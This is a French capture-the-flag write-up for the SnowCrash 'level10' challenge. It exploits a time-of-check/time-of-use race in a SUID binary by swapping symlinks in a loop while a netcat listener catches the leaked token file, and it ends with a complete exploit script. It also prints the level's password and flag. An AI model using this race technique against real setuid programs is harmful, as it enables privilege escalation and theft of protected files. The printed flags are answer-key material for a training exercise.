# Level10

```bash
ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

1) Analyse des permissions et du fonctionnement initial :
    - Lorsque vous examinez les permissions du fichier exécutable level10, vous remarquez qu'il a le bit SUID activé (-rwsr-sr-x+). Cela signifie que lorsqu'il est exécuté, il s'exécute avec les privilèges de l'utilisateur propriétaire du fichier, flag10 dans ce cas.

    - En exécutant ./level10 sans arguments, vous remarquez qu'il attend deux arguments : le premier est un fichier à envoyer, et le deuxième est l'hôte de destination. Si vous n'avez pas accès au fichier, il affiche "You don't have access to [nom du fichier]".

    - Vous découvrez que le programme se connecte à un hôte distant, probablement sur un port spécifique. Cependant, l'hôte cible n'est pas spécifié.

```bash
/level10
./level10 file host
        sends file to host if you have access to it

./level10 token localhost
You don't have access to token

./level10 /bin/ls localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```
```bash
echo '.*( )*.' > /tmp/swap;
```
2) Découverte du port cible :
    - Pour déterminer le port cible, vous créez un fichier vide nommé /tmp/swap contenant le motif .*( )*.. Ce motif sera utilisé pour filtrer les données reçues.
    - Vous démarrez un serveur Netcat en mode écoute (nc -l 6969) pour capturer les données envoyées par level10. Le filtre tr -d '.*( )*.' permet de supprimer les caractères spéciaux de ces données.
```bash
(while true; do nc -l 6969 | tr -d '.*( )*.'; done)& 
```

3) Création de liens symboliques :
    - Vous créez un script qui crée continuellement des liens symboliques (ln -fs) du fichier /tmp/swap vers /tmp/toto et du fichier token vers /tmp/toto.

```bash
(for (( ; ;)); do ~/level10 /tmp/toto 127.0.0.1 &> /dev/null; done;)&
```
4) Capture des données :
    - Maintenant, lorsque level10 est exécuté en continu avec /tmp/toto comme argument et en redirigeant vers l'adresse IP 127.0.0.1, il envoie continuellement des données.
    - Ces données sont interceptées par le serveur Netcat, filtrées à l'aide du motif, et stockées dans un fichier, prêt à être analysées.
```bash
for (( ; ; )); do         ln -fs /tmp/swap /tmp/toto;         ln -fs ~/token /tmp/toto; done;
```

5) Récupération du jeton :
    - Les liens symboliques sont continuellement modifiés pour pointer vers le fichier token. Le serveur Netcat filtre ces données et stocke le résultat dans un fichier.

Lorsque tout cela est en place, level10 envoie continuellement des données vers le serveur Netcat, qui les filtre et stocke le résultat dans un fichier. Parallèlement, les liens symboliques sont modifiés pour pointer vers le fichier token. Cette combinaison d'actions vous permet de récupérer le contenu de token et d'obtenir le jeton du niveau suivant.

```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

```

Script pour recup le flag

```bash
DEFAULT='.*( )*.'

echo $DEFAULT > /tmp/swap

(nc -l 6969 | grep -v -e "$DEFAULT") &

(
	while true; do
		ln -fs /tmp/swap /tmp/foo
		(ln -fs /home/user/level10/token /tmp/foo &)
		/home/user/level10/level10 /tmp/foo 127.0.0.1 &>/dev/null &
	done
)&

sleep 2
killall nc &>/dev/null
killall bash &>/dev/null
```

